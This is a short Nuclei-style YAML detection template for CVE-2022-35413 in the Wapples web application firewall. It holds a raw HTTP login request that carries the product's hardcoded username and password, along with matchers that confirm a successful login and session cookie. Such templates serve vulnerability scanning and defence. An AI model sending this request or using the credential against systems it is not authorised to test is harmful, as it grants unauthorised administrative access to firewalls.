id: wapples-hardcoded-credentials-cve-2022-35413
info:
  name: Wapples Web Application Firewall Hardcoded Credentials (CVE-2022-35413)
  author: ProjectDiscoveryAI
  severity: critical
  tags: CVE-2022-35413,hardcoded-credentials
  description: |
    A vulnerability in Wapples Web Application Firewall allows authentication bypass using hardcoded credentials.

http:
  - raw:
      - |
        POST /webapi/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=systemi&password=db/wp.no1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Authentication Success"
      - type: word
        part: body
        words:
          - "user_systemi"
      - type: word
        part: header
        words:
          - "WP_SESSID="
